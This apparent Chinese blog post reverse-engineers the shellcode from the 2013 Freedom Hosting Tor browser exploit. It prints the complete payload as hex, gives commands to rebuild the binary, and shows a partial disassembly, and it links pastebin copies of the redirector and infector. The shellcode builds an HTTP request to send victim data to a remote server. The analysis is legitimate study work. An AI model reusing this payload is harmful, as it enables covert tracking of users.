<!doctype html>
<html class="theme-next   use-motion ">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>



<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />












  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css"/>




  
    <link href='//fonts.lug.ustc.edu.cn/css?family=Lato:300,400,700,400italic&subset=latin,latin-ext' rel='stylesheet' type='text/css'>
  



<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=0.4.5.2" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="Reverland, Hexo, NexT" />








  <link rel="shortcut icon" type="image/x-icon" href="/images/default_avatar.jpg?v=0.4.5.2" />






<meta name="description" content="感想：
先说说，逆向真累，得一点点跟着函数流前进探索。靠反汇编引擎可不靠谱，跟着流程才是王道啊。
注释真是非常重要，为何要用IDA真是一目了然啊
来源：

Analysis of the FBI Tor Malware
Virustotal
Freedom Hosting FBI Shellcode Payload..
Re:”Remembering ‘08” Remembering Tor
re">
<meta property="og:type" content="article">
<meta property="og:title" content="FBI Tor Malware analysis(意译整理)">
<meta property="og:url" content="http://reverland.org/uncategorized/2014/08/14/fbi-tor-malware-analysis/index.html">
<meta property="og:site_name" content="Reverland的行知阁">
<meta property="og:description" content="感想：
先说说，逆向真累，得一点点跟着函数流前进探索。靠反汇编引擎可不靠谱，跟着流程才是王道啊。
注释真是非常重要，为何要用IDA真是一目了然啊
来源：

Analysis of the FBI Tor Malware
Virustotal
Freedom Hosting FBI Shellcode Payload..
Re:”Remembering ‘08” Remembering Tor
re">
<meta property="og:updated_time" content="2015-11-15T06:01:31.535Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="FBI Tor Malware analysis(意译整理)">
<meta name="twitter:description" content="感想：
先说说，逆向真累，得一点点跟着函数流前进探索。靠反汇编引擎可不靠谱，跟着流程才是王道啊。
注释真是非常重要，为何要用IDA真是一目了然啊
来源：

Analysis of the FBI Tor Malware
Virustotal
Freedom Hosting FBI Shellcode Payload..
Re:”Remembering ‘08” Remembering Tor
re">



<script type="text/javascript" id="hexo.configuration">
  var CONFIG = {
    scheme: '',
    sidebar: 'post',
    motion: true
  };
</script>

  <title> FBI Tor Malware analysis(意译整理) | Reverland的行知阁 </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  <!--[if lte IE 8]>
  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
           style='margin-left:auto;margin-right:auto;display: block;'/>
    </a>
  </div>
<![endif]-->
  






  <div class="container one-column page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/"  class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">Reverland的行知阁</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
  <p class="site-subtitle">开放、分享、自由与进步</p>
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu ">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-home fa-fw"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-archive fa-fw"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-tags fa-fw"></i> <br />
            
            标签
          </a>
        </li>
      

      
      
    </ul>
  

  
</nav>

 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div id="content" class="content">
          

  <div id="posts" class="posts-expand">
    

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                FBI Tor Malware analysis(意译整理)
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-08-14T00:00:00+08:00" content="2014-08-14">
              2014-08-14
            </time>
          </span>

          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/uncategorized/2014/08/14/fbi-tor-malware-analysis/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="uncategorized/2014/08/14/fbi-tor-malware-analysis/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        <span itemprop="articleBody"><p>感想：</p>
<p>先说说，逆向真累，得一点点跟着函数流前进探索。靠反汇编引擎可不靠谱，跟着流程才是王道啊。</p>
<p>注释真是非常重要，为何要用IDA真是一目了然啊</p>
<p>来源：</p>
<ul>
<li><a href="http://ghowen.me/fbi-tor-malware-analysis/" target="_blank" rel="external">Analysis of the FBI Tor Malware</a></li>
<li><a href="https://www.virustotal.com/en/file/74414c3397dc0de10fbe0adedb7f033028fe4bb57ac4f51784a6df1a7b0114f0/analysis/" target="_blank" rel="external">Virustotal</a></li>
<li><a href="http://pastebin.com/aFUP2gLB" target="_blank" rel="external">Freedom Hosting FBI Shellcode Payload..</a></li>
<li><a href="http://www.blizzhackers.cc/viewtopic.php?f=52&amp;t=496643&amp;start=15" target="_blank" rel="external">Re:”Remembering ‘08” Remembering Tor</a></li>
<li><a href="http://pastebin.com/K61QZpzb" target="_blank" rel="external">redirector</a></li>
<li><a href="http://pastebin.com/GZ1Kg3cb" target="_blank" rel="external">infector</a></li>
<li><a href="http://pastebin.com/gVna4pi2" target="_blank" rel="external">shellcode</a></li>
</ul>
<p>Tor是一个让人们不被追踪地浏览网页和获取服务的匿名网络。作为这个网络的一部分，存在所谓的“<a href="http://www.zhihu.com/question/22759179" target="_blank" rel="external">暗网</a>”。这些网络只能通过Tor连接。虽然很多服务是无辜的或者抵制人权滥用，网络的匿名性也吸引了有目的的犯罪比如儿童色情。法律机构<a href="http://en.wikipedia.org/wiki/Tor\_(anonymity_network" target="_blank" rel="external">无法</a>#Hidden_services)追踪到源IP地址。</p>
<p>2013年，在Freedom Hosting的暗网服务器上发现了一个恶意程序，该程序挖掘特定浏览器的漏洞并在用户计算机上执行程序。该程序搜集用户信息并发送到Virginia的服务器，然后使浏览器崩溃。它没有明显的恶意程序特征。因此有猜测这个程序是在Virginia有办公室的的FBI制作的。FBI<a href="http://en.wikipedia.org/wiki/Computer_and_Internet_Protocol_Address_Verifier" target="_blank" rel="external">有权编写恶意程序</a>。看起来这个猜测是<a href="http://www.wired.com/threatlevel/2013/09/freedom-hosting-fbi/" target="_blank" rel="external">真的</a>。现在已经确认为FBI代号为<a href="http://cryptome.org/2013/10/nsa-egotisticalgiraffe.pdf" target="_blank" rel="external"> EgotisticalGiraffe</a>的作品。</p>
<h2 id="逆向之">逆向之</h2><h3 id="漏洞挖掘程序">漏洞挖掘程序</h3><p>漏洞挖掘程序是javascript写的，挖掘了一个特定版本firefox的已知bug。挖掘程序经过充分混淆但是快速扫描能找到很长的16进制字符串，在前几个字符能明显看到操作符(通常在shellcode开头有jmp或者call，知道这一点就很容易找到shellcode了)。</p>
<p>首先，攻击者在网页中嵌入了一个链接向恶意页面的<code>iframe</code>，将受害者定向到感染页面。参见这里<a href="http://pastebin.com/bu2Ya0n6" target="_blank" rel="external">Freedom Hosting FBI IFRAME Redirector Malware Script</a>。</p>
<p>在受害者被重定向到真正的感染页面后，在三个iframe之间执行js，进一步混淆执行流程。最终触发漏洞，注入shellcode。参见<a href="http://pastebin.com/RTwsyrH8" target="_blank" rel="external">Freedom Hosting FBI Malware Infector (ForPayload) JavaScript</a></p>
<p>js那部分就不说了，我们看看shellcode。</p>
<h3 id="位置独立代码">位置独立代码</h3><p>shellcode必须直接注入进程运行。它不知道自己会被注入到什么位置，也不知道Windows API函数的地址。</p>
<p>因此，必须想些办法获取这些信息。FBI的这个程序使用了一个找到地址的常用方法：</p>
<pre><code><span class="built_in">call</span> start
<span class="keyword">star</span><span class="variable">t:</span>
<span class="keyword">pop</span> ebp
</code></pre><p><code>call start</code>做了两件事，首先，把下一个要执行的指令的地址即<code>pop ebp</code>的地址压入栈，然后跳转到<code>start</code>标签位置，就是继续执行<code>pop ebp</code>。再执行完<code>pop ebp</code>后，<code>pop ebp</code>的地址就存入了<code>ebp</code>寄存器。以此为标准就能获取shellcode中的其它数据。</p>
<h3 id="定位Windows_API">定位Windows API</h3><p>译者：啊啊啊啊啊，都忘记这部分怎么回事了。大家可以看看</p>
<ul>
<li><a href="http://projectshellcode.com/?q=node/12" target="_blank" rel="external">Project shellcode上的教程</a>。</li>
<li>有本专讲win32 shellcode的书<a href="nologin.org/Downloads/Papers/win32-shellcode.pdf">Understanding Windows Shellcode</a></li>
<li><a href="http://www.codeproject.com/Articles/325776/The-Art-of-Win-Shellcoding" target="_blank" rel="external">The Art of Win32 Shellcoding</a></li>
</ul>
<p>应用程序知道Windows载入的API在哪里，但shellcode不会知道。常见方法是查看<code>fs</code>寄存器指向的<a href="http://en.wikipedia.org/wiki/Win32_Thread_Information_Block" target="_blank" rel="external">线程信息块(TIB)</a>.通过这个结构可以定位宿主程序DLL函数的位置，遍历DLL导出表知道找到函数。此过程非常无聊，所以FBI都使用了Metasploit项目<a href="https://github.com/iagox86/nbtool/blob/master/samples/shellcode-win32/block_api.asm" target="_blank" rel="external">Stephen Fewer的函数解析器</a>。</p>
<pre><code><span class="keyword">push</span> arguments
...
<span class="keyword">push</span> FUNCTIONHASH
<span class="keyword">call</span> Stephen的解析器
</code></pre><p>函数哈希通过对函数名简单的哈希算法实现，你可以用别人做好的<a href="http://scriptjunkie1.110mb.com/hashes/index.html" target="_blank" rel="external">哈希表</a>,可以用别人的哈希计算<a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/hash.py" target="_blank" rel="external">程序</a>，甚至<a href="http://projectshellcode.com/node/21" target="_blank" rel="external">自己在shellcode中计算</a>。</p>
<h2 id="开始">开始</h2><p>首先先获取shellcode吧，把以下一堆hex保存到<code>input.txt</code>里</p>
<pre><code>60FCE<span class="number">88A00000060</span><span class="number">89E531D26</span><span class="number">48B52308B52</span><span class="number">0C8B52148</span>B72280FB74A2631FF31C0AC<span class="number">3C617C02</span>2C20C1CF<span class="number">0D01C7E2</span>F<span class="number">052578B52</span><span class="number">108B423C01</span>D<span class="number">08B407885</span>C<span class="number">0744A01D05</span><span class="number">08B48188B58</span><span class="number">2001D3E33</span>C<span class="number">498B348</span>B01D631FF31C0ACC1CF<span class="number">0D01C738</span>E<span class="number">075F4037</span>DF<span class="number">83B7D2475</span>E<span class="number">2588B58240</span><span class="number">1D3668B0</span>C<span class="number">4B8B581</span>C<span class="number">01D38B048</span>B<span class="number">01D08944242</span><span class="number">45B5B61595</span>A51FFE<span class="number">0585F5A8</span>B12EB<span class="number">86055D81</span>BDE<span class="number">90200004745</span><span class="number">542075708</span>D<span class="number">85D102000050</span><span class="number">684C77260</span>7FFD<span class="number">585C0745</span>E<span class="number">8D85D80200</span><span class="number">0050684C77</span>2607FFD<span class="number">585C0744</span>CBB<span class="number">9001000029</span>DC<span class="number">54536829806</span>B00FFD501DC<span class="number">85C07536505</span><span class="number">05050405040</span>5068EA0FDFE0FFD531DBF<span class="number">7D339C37</span><span class="number">41F89C36A108</span>DB<span class="number">5E102000056</span><span class="number">536899A57</span>461FFD<span class="number">585C0741</span>FFE<span class="number">8D89000000</span>75E380BD<span class="number">4F02000001</span><span class="number">7407E83B01</span>0000EB<span class="number">05E84D01000</span>0FFE<span class="number">7B80001000</span><span class="number">029C489</span>E<span class="number">252505268B64</span>9DE01FFD<span class="number">55F81C40001</span><span class="number">000085C00</span>F<span class="number">85F200000057</span>E<span class="number">8F90000005</span>E89CA8DBDE<span class="number">9020000E8</span>EB<span class="number">0000004F83</span>FA207C05BA<span class="number">2000000089</span>D<span class="number">156F3A4B90</span>D<span class="number">0000008</span>DB<span class="number">5C4020000</span>F3A489BD<span class="number">4B0200005</span>E<span class="number">5668A92834</span>80FFD<span class="number">585C00F84</span>AA<span class="number">000000668</span>B<span class="number">480A6683</span>F<span class="number">9040F829</span>C<span class="number">0000008D40</span><span class="number">0C8B008</span>B<span class="number">088B09B80</span><span class="number">00100005089</span>E<span class="number">729C489</span>E<span class="number">657565151684</span><span class="number">872D2B8</span>FFD<span class="number">585C081</span>C<span class="number">4040100000</span>FB<span class="number">70F83F90672</span>6CB<span class="number">906000000</span>B<span class="number">81000000029</span>C<span class="number">489E789</span>CAD<span class="number">1E2505231D28</span><span class="keyword">A</span><span class="number">1688D024</span>F<span class="number">0C0E8043</span>C<span class="number">0977040430</span>EB<span class="number">02043788074</span><span class="number">788D0240</span>F<span class="number">3C09770404</span>30EB<span class="number">02043788074</span><span class="number">746E2D45</span>929CF89FE5801C48BBD<span class="number">4B020000</span>F<span class="number">3A4C6854</span>F<span class="number">02000001E82</span>E<span class="number">00000031C05</span>05129CF<span class="number">4F575368</span>C2EB385FFFD<span class="number">55368756E4</span>D61FFD5E9C8FEFFFF<span class="number">31C9F7D131</span>C0F2AEF<span class="number">7D149C30000</span><span class="number">0000008</span>DBDE<span class="number">9020000E8</span>E4FFFFFF4FB<span class="number">94F0000008</span>DB<span class="number">575020000</span>F3A48DBDE<span class="number">9020000E8</span>CBFFFFFFC<span class="number">30D0A436</span>F<span class="number">6E6E65637</span><span class="number">4696F6E3</span><span class="keyword">A</span><span class="number">206B6565702</span>D<span class="number">616C69766</span><span class="number">50D0A41636</span><span class="number">36570743A202</span><span class="keyword">A</span><span class="number">2F2A0D0</span><span class="keyword">A</span><span class="number">41636365707</span><span class="number">42D456E63</span><span class="number">6F64696E67</span><span class="number">3A20677A69</span><span class="number">700D0A0</span>D<span class="number">0A0083C70</span>E<span class="number">31C9F7D131</span>C0F3AE4FFFE<span class="number">70D0A436</span>F<span class="number">6F6B69653</span><span class="keyword">A</span><span class="number">2049443D77</span><span class="number">73325F333200</span><span class="number">4950484C50</span><span class="number">415049000200</span>005041DECA<span class="number">36474554202</span>F<span class="number">303563656134</span><span class="number">64652D39353</span><span class="number">1642D34303</span><span class="number">3372D62663</span><span class="number">8662D66363</span><span class="number">93035356232</span><span class="number">37396262204</span><span class="number">85454502F31</span><span class="number">2E310D0</span><span class="keyword">A</span><span class="number">486F73743</span><span class="keyword">A</span><span class="number">200000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">0000090</span>
</code></pre><p>然后使用<code>xxd</code>转化为二进制文件。</p>
<pre><code>$ xxd -r -<span class="tag">p</span> hex_input<span class="class">.txt</span> magneto<span class="class">.payload</span><span class="class">.shellcode</span>
$ ls -al magneto<span class="class">.payload</span><span class="class">.shellcode</span>
-rw-r--r-- <span class="number">1</span> reverland reverland <span class="number">956</span> Aug <span class="number">14</span> <span class="number">19</span>:<span class="number">29</span> magneto<span class="class">.payload</span><span class="class">.shellcode</span>
$ sha256sum magneto<span class="class">.payload</span><span class="class">.shellcode</span>
<span class="number">74414</span>c3397dc0de10fbe0adedb7f033028fe4bb57ac4f51784a6df1a7b0114f0  magneto<span class="class">.payload</span><span class="class">.shellcode</span>
</code></pre><p>首先反汇编shellcode：</p>
<pre><code> ~/Work/project/reverse/<span class="keyword">test</span> ⮀ <span class="literal">r2</span> -b <span class="number">32</span> -k w32 -a x86 magneto.payload.shellcode
 -- Everything <span class="preprocessor">up</span>-to-date.
[<span class="number">0x00000000</span>]&gt; pD <span class="number">956</span>
            <span class="number">0x00000000</span>    <span class="number">60</span>           <span class="keyword">pushad</span>
            <span class="number">0x00000001</span>    fc           <span class="keyword">cld</span>
            <span class="number">0x00000002</span>    e88a000000   <span class="keyword">call</span> <span class="number">0x91</span>
               <span class="number">0x00000091</span>(unk)
            <span class="number">0x00000007</span>    <span class="number">60</span>           <span class="keyword">pushad</span>
            <span class="number">0x00000008</span>    89e5         <span class="keyword">mov</span> <span class="literal">ebp</span>, <span class="literal">esp</span>
            <span class="number">0x0000000a</span>    31d2         <span class="keyword">xor</span> <span class="literal">edx</span>, <span class="literal">edx</span>
            <span class="number">0x0000000c</span>    648b5230     <span class="keyword">mov</span> <span class="literal">edx</span>, [<span class="literal">fs</span>:<span class="literal">edx</span>+<span class="number">0x30</span>]
            <span class="number">0x00000010</span>    8b520c       <span class="keyword">mov</span> <span class="literal">edx</span>, [<span class="literal">edx</span>+<span class="number">0xc</span>]
            <span class="number">0x00000013</span>    8b5214       <span class="keyword">mov</span> <span class="literal">edx</span>, [<span class="literal">edx</span>+<span class="number">0x14</span>]
   .------&gt; <span class="number">0x00000016</span>    8b7228       <span class="keyword">mov</span> <span class="literal">esi</span>, [<span class="literal">edx</span>+<span class="number">0x28</span>]
   |        <span class="number">0x00000019</span>    0fb74a26     <span class="keyword">movzx</span> <span class="literal">ecx</span>, <span class="preprocessor">word</span> [<span class="literal">edx</span>+<span class="number">0x26</span>]
   |        <span class="number">0x0000001d</span>    31ff         <span class="keyword">xor</span> <span class="literal">edi</span>, <span class="literal">edi</span>
   |   .--&gt; <span class="number">0x0000001f</span>    31c0         <span class="keyword">xor</span> <span class="literal">eax</span>, <span class="literal">eax</span>
   |   |    <span class="number">0x00000021</span>    ac           <span class="keyword">lodsb</span>
   |   |    <span class="number">0x00000022</span>    3c61         <span class="keyword">cmp</span> <span class="literal">al</span>, <span class="number">0x61</span>
   |   |,=&lt; <span class="number">0x00000024</span>    7c02         <span class="keyword">jl</span> <span class="number">0x28</span>
   |   ||   <span class="number">0x00000026</span>    2c20         <span class="keyword">sub</span> <span class="literal">al</span>, <span class="number">0x20</span>
   |   |<span class="string">`-&gt; 0x00000028    c1cf0d       ror edi, 0xd
   |   |    0x0000002b    01c7         add edi, eax
   |   `</span>==&lt; <span class="number">0x0000002d</span>    e2f0         <span class="keyword">loop</span> <span class="number">0x1f</span>
   |        <span class="number">0x0000002f</span>    <span class="number">52</span>           <span class="keyword">push</span> <span class="literal">edx</span>
   |        <span class="number">0x00000030</span>    <span class="number">57</span>           <span class="keyword">push</span> <span class="literal">edi</span>
   |        <span class="number">0x00000031</span>    8b5210       <span class="keyword">mov</span> <span class="literal">edx</span>, [<span class="literal">edx</span>+<span class="number">0x10</span>]
   |        <span class="number">0x00000034</span>    8b423c       <span class="keyword">mov</span> <span class="literal">eax</span>, [<span class="literal">edx</span>+<span class="number">0x3c</span>]
   |        <span class="number">0x00000037</span>    01d0         <span class="keyword">add</span> <span class="literal">eax</span>, <span class="literal">edx</span>
   |        <span class="number">0x00000039</span>    8b4078       <span class="keyword">mov</span> <span class="literal">eax</span>, [<span class="literal">eax</span>+<span class="number">0x78</span>]
   |        <span class="number">0x0000003c</span>    85c0         <span class="keyword">test</span> <span class="literal">eax</span>, <span class="literal">eax</span>
   |  ,===&lt; <span class="number">0x0000003e</span>    744a         <span class="keyword">je</span> <span class="number">0x8a</span>
   |  |     <span class="number">0x00000040</span>    01d0         <span class="keyword">add</span> <span class="literal">eax</span>, <span class="literal">edx</span>
   |  |     <span class="number">0x00000042</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
   |  |     <span class="number">0x00000043</span>    8b4818       <span class="keyword">mov</span> <span class="literal">ecx</span>, [<span class="literal">eax</span>+<span class="number">0x18</span>]
   |  |     <span class="number">0x00000046</span>    8b5820       <span class="keyword">mov</span> <span class="literal">ebx</span>, [<span class="literal">eax</span>+<span class="number">0x20</span>]
   |  |     <span class="number">0x00000049</span>    01d3         <span class="keyword">add</span> <span class="literal">ebx</span>, <span class="literal">edx</span>
   |.-----&gt; <span class="number">0x0000004b</span>    e33c         <span class="keyword">jecxz</span> <span class="number">0x89</span>
   || |     <span class="number">0x0000004d</span>    <span class="number">49</span>           <span class="keyword">dec</span> <span class="literal">ecx</span>
   || |     <span class="number">0x0000004e</span>    8b348b       <span class="keyword">mov</span> <span class="literal">esi</span>, [<span class="literal">ebx</span>+<span class="literal">ecx</span>*<span class="number">4</span>]
   || |     <span class="number">0x00000051</span>    01d6         <span class="keyword">add</span> <span class="literal">esi</span>, <span class="literal">edx</span>
   || |     <span class="number">0x00000053</span>    31ff         <span class="keyword">xor</span> <span class="literal">edi</span>, <span class="literal">edi</span>
   ||.----&gt; <span class="number">0x00000055</span>    31c0         <span class="keyword">xor</span> <span class="literal">eax</span>, <span class="literal">eax</span>
   ||||     <span class="number">0x00000057</span>    ac           <span class="keyword">lodsb</span>
   ||||     <span class="number">0x00000058</span>    c1cf0d       <span class="keyword">ror</span> <span class="literal">edi</span>, <span class="number">0xd</span>
   ||||     <span class="number">0x0000005b</span>    01c7         <span class="keyword">add</span> <span class="literal">edi</span>, <span class="literal">eax</span>
   ||||     <span class="number">0x0000005d</span>    38e0         <span class="keyword">cmp</span> <span class="literal">al</span>, <span class="number">ah</span>
   ||<span class="string">`====&lt; 0x0000005f    75f4         jne 0x55
   || |     0x00000061    037df8       add edi, [ebp-0x8]
   || |     0x00000064    3b7d24       cmp edi, [ebp+0x24]
   |`</span>=====&lt; <span class="number">0x00000067</span>    75e2         <span class="keyword">jne</span> <span class="number">0x4b</span>
   |  |     <span class="number">0x00000069</span>    <span class="number">58</span>           <span class="keyword">pop</span> <span class="literal">eax</span>
   |  |     <span class="number">0x0000006a</span>    8b5824       <span class="keyword">mov</span> <span class="literal">ebx</span>, [<span class="literal">eax</span>+<span class="number">0x24</span>]
   |  |     <span class="number">0x0000006d</span>    01d3         <span class="keyword">add</span> <span class="literal">ebx</span>, <span class="literal">edx</span>
   |  |     <span class="number">0x0000006f</span>    668b0c4b     <span class="keyword">mov</span> <span class="literal">cx</span>, [<span class="literal">ebx</span>+<span class="literal">ecx</span>*<span class="number">2</span>]
   |  |     <span class="number">0x00000073</span>    8b581c       <span class="keyword">mov</span> <span class="literal">ebx</span>, [<span class="literal">eax</span>+<span class="number">0x1c</span>]
   |  |     <span class="number">0x00000076</span>    01d3         <span class="keyword">add</span> <span class="literal">ebx</span>, <span class="literal">edx</span>
   |  |     <span class="number">0x00000078</span>    8b048b       <span class="keyword">mov</span> <span class="literal">eax</span>, [<span class="literal">ebx</span>+<span class="literal">ecx</span>*<span class="number">4</span>]
   |  |     <span class="number">0x0000007b</span>    01d0         <span class="keyword">add</span> <span class="literal">eax</span>, <span class="literal">edx</span>
   |  |     <span class="number">0x0000007d</span>    <span class="number">89442424</span>     <span class="keyword">mov</span> [<span class="literal">esp</span>+<span class="number">0x24</span>], <span class="literal">eax</span>
   |  |     <span class="number">0x00000081</span>    5b           <span class="keyword">pop</span> <span class="literal">ebx</span>
   |  |     <span class="number">0x00000082</span>    5b           <span class="keyword">pop</span> <span class="literal">ebx</span>
   |  |     <span class="number">0x00000083</span>    <span class="number">61</span>           <span class="keyword">popad</span>
   |  |     <span class="number">0x00000084</span>    <span class="number">59</span>           <span class="keyword">pop</span> <span class="literal">ecx</span>
   |  |     <span class="number">0x00000085</span>    5a           <span class="keyword">pop</span> <span class="literal">edx</span>
   |  |     <span class="number">0x00000086</span>    <span class="number">51</span>           <span class="keyword">push</span> <span class="literal">ecx</span>
   |  |     <span class="number">0x00000087</span>    ffe0         <span class="keyword">jmp</span> <span class="literal">eax</span>
   |  |     <span class="number">0x00000089</span>    <span class="number">58</span>           <span class="keyword">pop</span> <span class="literal">eax</span>
   |  <span class="string">`---&gt; 0x0000008a    5f           pop edi
   |        0x0000008b    5a           pop edx
   |        0x0000008c    8b12         mov edx, [edx]
   `</span>======&lt; <span class="number">0x0000008e</span>    eb86         <span class="keyword">jmp</span> <span class="number">0x16</span>
</code></pre><p>首先</p>
<pre><code><span class="keyword">pushad</span>
<span class="keyword">cld</span>
</code></pre><p>将寄存器内容保存在堆栈上并清空寄存器内容。</p>
<p>然后可以看到从<code>0x00000002</code>调用<code>0x00000091</code>。那从<code>0x00000007</code>开始是啥？参考之前stephen的函数解析器，一直到<code>0x0000008e</code>都是解析器。唉？<code>0x90</code>是啥？到<code>0x00000091</code>开始：</p>
<pre><code>[<span class="number">0x00000000</span>]&gt; pD @<span class="number">0x91</span>
            <span class="number">0x00000091</span>    <span class="number">5d</span>           <span class="keyword">pop</span> <span class="literal">ebp</span>
            <span class="number">0x00000092</span>    81bde902000. <span class="keyword">cmp</span> <span class="preprocessor">dword</span> [<span class="literal">ebp</span>+<span class="number">0x2e9</span>], <span class="number">0x20544547</span>
        ,=&lt; <span class="number">0x0000009c</span>    <span class="number">7570</span>         <span class="keyword">jne</span> <span class="number">0x10e</span>
        |   <span class="number">0x0000009e</span>    8d85d1020000 <span class="keyword">lea</span> <span class="literal">eax</span>, [<span class="literal">ebp</span>+<span class="number">0x2d1</span>]
        |   <span class="number">0x000000a4</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
        |   <span class="number">0x000000a5</span>    684c772607   <span class="keyword">push</span> <span class="number">0x726774c</span> <span class="comment">;  0x0726774c </span>
        |   <span class="number">0x000000aa</span>    ffd5         <span class="keyword">call</span> <span class="literal">ebp</span>
        |      <span class="number">0x00000000</span>(unk, unk, unk, unk, unk, unk, unk, unk)
        |   <span class="number">0x000000ac</span>    85c0         <span class="keyword">test</span> <span class="literal">eax</span>, <span class="literal">eax</span>
       ,==&lt; <span class="number">0x000000ae</span>    745e         <span class="keyword">je</span> <span class="number">0x10e</span>
       ||   <span class="number">0x000000b0</span>    8d85d8020000 <span class="keyword">lea</span> <span class="literal">eax</span>, [<span class="literal">ebp</span>+<span class="number">0x2d8</span>]
       ||   <span class="number">0x000000b6</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
       ||   <span class="number">0x000000b7</span>    684c772607   <span class="keyword">push</span> <span class="number">0x726774c</span> <span class="comment">;  0x0726774c </span>
       ||   <span class="number">0x000000bc</span>    ffd5         <span class="keyword">call</span> <span class="literal">ebp</span>
       ||      <span class="number">0x00000000</span>(unk, unk)
       ||   <span class="number">0x000000be</span>    85c0         <span class="keyword">test</span> <span class="literal">eax</span>, <span class="literal">eax</span>
      ,===&lt; <span class="number">0x000000c0</span>    744c         <span class="keyword">je</span> <span class="number">0x10e</span>
      |||   <span class="number">0x000000c2</span>    bb90010000   <span class="keyword">mov</span> <span class="literal">ebx</span>, <span class="number">0x190</span> <span class="comment">;  0x00000190 </span>
      |||   <span class="number">0x000000c7</span>    29dc         <span class="keyword">sub</span> <span class="literal">esp</span>, <span class="literal">ebx</span>
      |||   <span class="number">0x000000c9</span>    <span class="number">54</span>           <span class="keyword">push</span> <span class="literal">esp</span>
      |||   <span class="number">0x000000ca</span>    <span class="number">53</span>           <span class="keyword">push</span> <span class="literal">ebx</span>
      |||   <span class="number">0x000000cb</span>    6829806b00   <span class="keyword">push</span> <span class="number">0x6b8029</span> <span class="comment">;  0x006b8029 </span>
      |||   <span class="number">0x000000d0</span>    ffd5         <span class="keyword">call</span> <span class="literal">ebp</span>
      |||      <span class="number">0x00000000</span>(unk, unk, unk)
      |||   <span class="number">0x000000d2</span>    01dc         <span class="keyword">add</span> <span class="literal">esp</span>, <span class="literal">ebx</span>
      |||   <span class="number">0x000000d4</span>    85c0         <span class="keyword">test</span> <span class="literal">eax</span>, <span class="literal">eax</span>
     ,====&lt; <span class="number">0x000000d6</span>    <span class="number">7536</span>         <span class="keyword">jne</span> <span class="number">0x10e</span>
     ||||   <span class="number">0x000000d8</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
     ||||   <span class="number">0x000000d9</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
     ||||   <span class="number">0x000000da</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
     ||||   <span class="number">0x000000db</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
     ||||   <span class="number">0x000000dc</span>    <span class="number">40</span>           <span class="keyword">inc</span> <span class="literal">eax</span>
     ||||   <span class="number">0x000000dd</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
     ||||   <span class="number">0x000000de</span>    <span class="number">40</span>           <span class="keyword">inc</span> <span class="literal">eax</span>
     ||||   <span class="number">0x000000df</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
     ||||   <span class="number">0x000000e0</span>    68ea0fdfe0   <span class="keyword">push</span> <span class="number">0xe0df0fea</span> <span class="comment">;  0xe0df0fea </span>
     ||||   <span class="number">0x000000e5</span>    ffd5         <span class="keyword">call</span> <span class="literal">ebp</span>
